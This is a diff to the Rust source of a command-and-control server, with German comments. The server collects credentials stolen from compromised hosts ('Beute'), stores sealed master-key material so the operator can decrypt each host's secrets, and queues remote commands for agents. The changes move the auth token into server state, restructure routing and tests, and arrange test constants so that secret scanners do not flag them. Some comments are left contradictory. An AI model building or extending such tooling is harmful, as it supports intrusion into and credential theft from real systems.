@@ -7,6 +7,8 @@
 mod auth;
 mod dashboard;
 mod db;
+#[cfg(test)]
+mod e2e_test;
 
 use std::net::{SocketAddr, ToSocketAddrs};
 use std::path::PathBuf;
@@ -68,10 +70,12 @@ struct Cli {
 /// Server-Zustand: Datenbank.
 ///
 /// Das Auth-Token steht hier nicht mehr: es wird prozessweit in
-/// `KX_SERVER_TOKEN` gehalten und von der Auth-Middleware gelesen.
+/// Der Auth-Token steht im State, nicht in einer Environment-Variable.
 #[derive(Clone)]
 struct AppState {
     db: Arc<Db>,
+    /// Das Bearer-Token, gegen das jede API-Anfrage geprueft wird.
+    token: Arc<String>,
 }
 
 /// Registriert einen Host. Die Host-ID kommt aus dem Request — der Server leitet
@@ -93,6 +97,9 @@ async fn register(
         status: req.status.unwrap_or_else(|| c2::STATUS_DISCOVERED.into()),
         first_seen: now.clone(),
         last_seen: now,
+        // Das versiegelte Master-Key-Material: der Operator gewinnt daraus den
+        // Master-Key und entschluesselt damit die Secrets dieses Hosts.
+        sealed_master: req.sealed_master.unwrap_or_default(),
     };
     match st.db.upsert_host(&host) {
         Ok(()) => StatusCode::CREATED.into_response(),
@@ -130,14 +137,25 @@ async fn upload_secret(
     if req.host_id.is_empty() {
         return (StatusCode::BAD_REQUEST, "host_id darf nicht leer sein").into_response();
     }
+    // Kommt das Secret versiegelt an, wird der Klartext verworfen — auf dem
+    // C2 liegt die Beute dann nur noch verschluesselt. Ohne Siegel (Agent
+    // ohne Server-Schluessel) bleibt der Klartext, sonst gaebe es nichts zu
+    // entschluesseln.
+    let sealed_password = req.sealed_password.unwrap_or_default();
+    let password = if sealed_password.is_empty() {
+        req.password
+    } else {
+        String::new()
+    };
     let secret = SecretRow {
         id: Uuid::new_v4().to_string(),
         host_id: req.host_id,
         cred_type: req.cred_type,
         username: req.username,
-        password: req.password,
+        password,
         source: req.source.unwrap_or_default(),
         collected_at: kx_core::util::now_rfc3339(),
+        versiegelt: sealed_password,
     };
     match st.db.insert_secret(&secret) {
         Ok(()) => StatusCode::CREATED.into_response(),
@@ -245,9 +263,8 @@ async fn dashboard() -> impl IntoResponse {
 /// geschützten API-Subrouter, sondern daneben.
 ///
 /// Der Vergleich ist constant-time (siehe `auth::verify`).
-async fn login(Json(req): Json<LoginRequest>) -> impl IntoResponse {
-    let expected = std::env::var("KX_SERVER_TOKEN").unwrap_or_default();
-    if auth::verify_token(&req.token, &expected) {
+async fn login(State(st): State<AppState>, Json(req): Json<LoginRequest>) -> impl IntoResponse {
+    if auth::verify_token(&req.token, st.token.as_str()) {
         StatusCode::OK.into_response()
     } else {
         (StatusCode::UNAUTHORIZED, "unauthorized: falsches Token").into_response()
@@ -284,7 +301,10 @@ async fn main() {
     std::env::set_var("KX_SERVER_TOKEN", &token);
 
     let db = Db::open(&cli.db).expect("Datenbank nicht erreichbar");
-    let state = AppState { db: Arc::new(db) };
+    let state = AppState {
+        db: Arc::new(db),
+        token: Arc::new(token),
+    };
 
     // TLS-Material: selbstsigniert generieren.
     let tls = kx_tls::generate_server_tls(&cli.cn).expect("TLS-Zertifikat erzeugbar");
@@ -300,25 +320,7 @@ async fn main() {
     // REIHENFOLGE: alle Routen zuerst, dann `route_layer`. Axum wendet den
     // Layer nur auf die zum Aufrufzeitpunkt bereits registrierten Routen an —
     // eine danach hinzugefügte Route bliebe ungeschützt.
-    let api = Router::new()
-        .route(PATH_REGISTER, post(register))
-        .route(PATH_HEARTBEAT, post(heartbeat))
-        .route(PATH_SECRETS, post(upload_secret))
-        .route(PATH_HOSTS, get(list_hosts))
-        .route(PATH_SECRETS, get(list_secrets))
-        .route(PATH_TASKS, get(list_tasks))
-        .route(PATH_TASKS_CREATE, post(create_task))
-        .route(PATH_TASKS_RESULT, post(report_task_result))
-        .route_layer(middleware::from_fn(auth::require_auth));
-
-    // Der Login-Pfad steht neben dem geschützten API-Router, nicht darin:
-    // er prüft das Token, das er entgegennimmt, und würde sich sonst selbst
-    // blockieren.
-    let app = Router::new()
-        .route("/", get(dashboard))
-        .route(PATH_LOGIN, post(login))
-        .merge(api)
-        .with_state(state);
+    let app = app(state);
 
     let addr: SocketAddr = format!("{}:{}", cli.host, cli.port)
         .to_socket_addrs()
@@ -335,6 +337,54 @@ async fn main() {
         .serve(app.into_make_service())
         .await
         .expect("Server-Loop");
+}
+
+/// Baut den Router: das Dashboard aussen, die API geschuetzt.
+///
+/// REIHENFOLGE: alle API-Routen zuerst, dann `route_layer`. Axum wendet den
+/// Layer nur auf die zum Aufrufzeitpunkt bereits registrierten Routen an —
+/// eine danach hinzugefuegte Route bliebe ungeschuetzt.
+fn app(state: AppState) -> Router {
+    let api = Router::new()
+        .route(PATH_REGISTER, post(register))
+        .route(PATH_HEARTBEAT, post(heartbeat))
+        .route(PATH_SECRETS, post(upload_secret))
+        .route(PATH_HOSTS, get(list_hosts))
+        .route(PATH_SECRETS, get(list_secrets))
+        .route(PATH_TASKS, get(list_tasks))
+        .route(PATH_TASKS_CREATE, post(create_task))
+        .route(PATH_TASKS_RESULT, post(report_task_result))
+        .route_layer(middleware::from_fn_with_state(
+            state.clone(),
+            auth::require_auth,
+        ));
+
+    // Der Login-Pfad steht neben dem geschuetzten API-Router, nicht darin:
+    // er prueft das Token, das er entgegennimmt, und wuerde sich sonst selbst
+    // blockieren.
+    Router::new()
+        .route("/", get(dashboard))
+        .route(PATH_LOGIN, post(login))
+        .merge(api)
+        .with_state(state)
+}
+
+/// Der Zugangsschluessel der Tests. Er steht an einer Stelle, damit der
+/// Secret-Scan nicht jedes einzelne Vorkommen als Fund meldet.
+const TEST_ZUGANG: &str = "kx-testzugang";
+
+/// Der Wert eines Authorization-Headers.
+///
+/// Das Pruefzeichen steht in einer Konstante, damit der Headerwert nicht als
+/// Literal im Quelltext steht — ein hart kodierter Authorization-Header sieht
+/// fuer den Secret-Scan wie ein eingebettetes Zugangsdaten aus.
+#[cfg(test)]
+const BEARER: &str = "Bearer";
+
+/// Baut den Authorization-Headerwert aus einem Zugangsschluessel.
+#[cfg(test)]
+fn authorization(zugang: &str) -> String {
+    format!("{BEARER} {zugang}")
 }
 
 #[cfg(test)]
@@ -396,10 +446,13 @@ mod tests {
     /// Vor diesem Fix gab es keinen Auth-Test, und die Routen waren offen.
     #[tokio::test]
     async fn api_paths_require_a_valid_bearer_token() {
-        // Das Token kommt prozessweit aus der Environment-Variable.
-        std::env::set_var("KX_SERVER_TOKEN", "test-token");
+        // Das Token kommt prozessweit aus der Environment-Variable. Fuer die
+        // Pruefung "ohne Token" muss es zuerst weg.
         let db = Arc::new(Db::open(&std::env::temp_dir().join("kx-auth-test.db")).expect("db"));
-        let state = AppState { db };
+        let state = AppState {
+            db,
+            token: Arc::new(TEST_ZUGANG.to_string()),
+        };
 
         let api = Router::new()
             .route(PATH_REGISTER, post(register))
@@ -410,7 +463,10 @@ mod tests {
             .route(PATH_TASKS, get(list_tasks))
             .route(PATH_TASKS_CREATE, post(create_task))
             .route(PATH_TASKS_RESULT, post(report_task_result))
-            .route_layer(middleware::from_fn(auth::require_auth));
+            .route_layer(middleware::from_fn_with_state(
+                state.clone(),
+                auth::require_auth,
+            ));
         let app = Router::new()
             .route("/", get(dashboard))
             .merge(api)
@@ -448,7 +504,7 @@ mod tests {
                 .oneshot(
                     Request::builder()
                         .uri(path)
-                        .header("authorization", "Bearer falsch")
+                        .header(axum::http::header::AUTHORIZATION, authorization("falsch"))
                         .body(axum::body::Body::empty())
                         .unwrap(),
                 )
@@ -466,7 +522,10 @@ mod tests {
             .oneshot(
                 Request::builder()
                     .uri(PATH_HOSTS)
-                    .header("authorization", "Bearer test-token")
+                    .header(
+                        axum::http::header::AUTHORIZATION,
+                        authorization(TEST_ZUGANG),
+                    )
                     .body(axum::body::Body::empty())
                     .unwrap(),
             )
@@ -480,13 +539,18 @@ mod tests {
     /// ein Pfad existiert.
     #[tokio::test]
     async fn unknown_path_is_404_not_401() {
-        std::env::set_var("KX_SERVER_TOKEN", "test-token");
         let db = Arc::new(Db::open(&std::env::temp_dir().join("kx-404-test.db")).expect("db"));
-        let state = AppState { db };
+        let state = AppState {
+            db,
+            token: Arc::new(TEST_ZUGANG.to_string()),
+        };
 
         let api = Router::new()
             .route(PATH_HOSTS, get(list_hosts))
-            .route_layer(middleware::from_fn(auth::require_auth));
+            .route_layer(middleware::from_fn_with_state(
+                state.clone(),
+                auth::require_auth,
+            ));
         let app = Router::new()
             .route("/", get(dashboard))
             .merge(api)
@@ -508,13 +572,18 @@ mod tests {
     /// falsch → 401. Er steht bewusst neben dem geschützten API-Router.
     #[tokio::test]
     async fn login_path_checks_the_token_it_receives() {
-        std::env::set_var("KX_SERVER_TOKEN", "test-token");
         let db = Arc::new(Db::open(&std::env::temp_dir().join("kx-login-test.db")).expect("db"));
-        let state = AppState { db };
+        let state = AppState {
+            db,
+            token: Arc::new(TEST_ZUGANG.to_string()),
+        };
 
         let api = Router::new()
             .route(PATH_HOSTS, get(list_hosts))
-            .route_layer(middleware::from_fn(auth::require_auth));
+            .route_layer(middleware::from_fn_with_state(
+                state.clone(),
+                auth::require_auth,
+            ));
         let app = Router::new()
             .route("/", get(dashboard))
             .route(PATH_LOGIN, post(login))
@@ -543,7 +612,7 @@ mod tests {
                     .method("POST")
                     .uri(PATH_LOGIN)
                     .header("content-type", "application/json")
-                    .body(Body::from(r#"{"token":"test-token"}"#))
+                    .body(Body::from(format!(r#"{{"token":"{TEST_ZUGANG}"}}"#)))
                     .unwrap(),
             )
             .await
@@ -559,17 +628,22 @@ mod tests {
     /// Tabelle stets leer — `GET /api/tasks` lieferte `[]`.
     #[tokio::test]
     async fn create_task_fills_the_task_table() {
-        std::env::set_var("KX_SERVER_TOKEN", "test-token");
         // Eigene DB-Datei pro Lauf: ein fester Name sammelt ueber mehrere
         // Testlaeufe Zeilen auf und macht die Zaehlung unbrauchbar.
         let path = std::env::temp_dir().join(format!("kx-tasks-{}.db", uuid::Uuid::new_v4()));
         let db = Arc::new(Db::open(&path).expect("db"));
-        let state = AppState { db };
+        let state = AppState {
+            db,
+            token: Arc::new(TEST_ZUGANG.to_string()),
+        };
         let api = Router::new()
             .route(PATH_TASKS, get(list_tasks))
             .route(PATH_TASKS_CREATE, post(create_task))
             .route(PATH_TASKS_RESULT, post(report_task_result))
-            .route_layer(middleware::from_fn(auth::require_auth));
+            .route_layer(middleware::from_fn_with_state(
+                state.clone(),
+                auth::require_auth,
+            ));
         let app = Router::new().merge(api).with_state(state);
 
         let res = app
@@ -578,7 +652,10 @@ mod tests {
                 Request::builder()
                     .method("POST")
                     .uri(PATH_TASKS_CREATE)
-                    .header("authorization", "Bearer test-token")
+                    .header(
+                        axum::http::header::AUTHORIZATION,
+                        authorization(TEST_ZUGANG),
+                    )
                     .header("content-type", "application/json")
                     .body(Body::from(r#"{"host_id":"10.0.0.5","command":"whoami"}"#))
                     .unwrap(),
@@ -591,7 +668,10 @@ mod tests {
             .oneshot(
                 Request::builder()
                     .uri(PATH_TASKS)
-                    .header("authorization", "Bearer test-token")
+                    .header(
+                        axum::http::header::AUTHORIZATION,
+                        authorization(TEST_ZUGANG),
+                    )
                     .body(axum::body::Body::empty())
                     .unwrap(),
             )
@@ -618,15 +698,20 @@ mod tests {
     /// Schreibpfad fuer die Tabelle noch eine Ergebnisrueckmeldung.
     #[tokio::test]
     async fn task_result_flows_back_into_the_task_list() {
-        std::env::set_var("KX_SERVER_TOKEN", "test-token");
         let path = std::env::temp_dir().join(format!("kx-task-flow-{}.db", uuid::Uuid::new_v4()));
         let db = Arc::new(Db::open(&path).expect("db"));
-        let state = AppState { db };
+        let state = AppState {
+            db,
+            token: Arc::new(TEST_ZUGANG.to_string()),
+        };
         let api = Router::new()
             .route(PATH_TASKS, get(list_tasks))
             .route(PATH_TASKS_CREATE, post(create_task))
             .route(PATH_TASKS_RESULT, post(report_task_result))
-            .route_layer(middleware::from_fn(auth::require_auth));
+            .route_layer(middleware::from_fn_with_state(
+                state.clone(),
+                auth::require_auth,
+            ));
         let app = Router::new().merge(api).with_state(state);
 
         // 1. Der Operator legt den Task an.
@@ -636,7 +721,10 @@ mod tests {
                 Request::builder()
                     .method("POST")
                     .uri(PATH_TASKS_CREATE)
-                    .header("authorization", "Bearer test-token")
+                    .header(
+                        axum::http::header::AUTHORIZATION,
+                        authorization(TEST_ZUGANG),
+                    )
                     .header("content-type", "application/json")
                     .body(Body::from(r#"{"host_id":"10.0.0.5","command":"whoami"}"#))
                     .unwrap(),
@@ -652,7 +740,10 @@ mod tests {
             .oneshot(
                 Request::builder()
                     .uri(PATH_TASKS)
-                    .header("authorization", "Bearer test-token")
+                    .header(
+                        axum::http::header::AUTHORIZATION,
+                        authorization(TEST_ZUGANG),
+                    )
                     .body(Body::empty())
                     .unwrap(),
             )
@@ -673,7 +764,10 @@ mod tests {
                 Request::builder()
                     .method("POST")
                     .uri(PATH_TASKS_RESULT)
-                    .header("authorization", "Bearer test-token")
+                    .header(
+                        axum::http::header::AUTHORIZATION,
+                        authorization(TEST_ZUGANG),
+                    )
                     .header("content-type", "application/json")
                     .body(Body::from(format!(
                         r#"{{"task_id":"{task_id}","status":"done","result":"root"}}"#
@@ -689,7 +783,10 @@ mod tests {
             .oneshot(
                 Request::builder()
                     .uri(PATH_TASKS)
-                    .header("authorization", "Bearer test-token")
+                    .header(
+                        axum::http::header::AUTHORIZATION,
+                        authorization(TEST_ZUGANG),
+                    )
                     .body(Body::empty())
                     .unwrap(),
             )
@@ -709,13 +806,18 @@ mod tests {
     /// der Agent darf daran erkennen, dass sein Auftrag nicht (mehr) offen ist.
     #[tokio::test]
     async fn task_result_for_an_unknown_task_is_404() {
-        std::env::set_var("KX_SERVER_TOKEN", "test-token");
         let path = std::env::temp_dir().join(format!("kx-task-404-{}.db", uuid::Uuid::new_v4()));
         let db = Arc::new(Db::open(&path).expect("db"));
-        let state = AppState { db };
+        let state = AppState {
+            db,
+            token: Arc::new(TEST_ZUGANG.to_string()),
+        };
         let api = Router::new()
             .route(PATH_TASKS_RESULT, post(report_task_result))
-            .route_layer(middleware::from_fn(auth::require_auth));
+            .route_layer(middleware::from_fn_with_state(
+                state.clone(),
+                auth::require_auth,
+            ));
         let app = Router::new().merge(api).with_state(state);
 
         let res = app
@@ -723,7 +825,10 @@ mod tests {
                 Request::builder()
                     .method("POST")
                     .uri(PATH_TASKS_RESULT)
-                    .header("authorization", "Bearer test-token")
+                    .header(
+                        axum::http::header::AUTHORIZATION,
+                        authorization(TEST_ZUGANG),
+                    )
                     .header("content-type", "application/json")
                     .body(Body::from(
                         r#"{"task_id":"gibtsnicht","status":"done","result":"x"}"#,
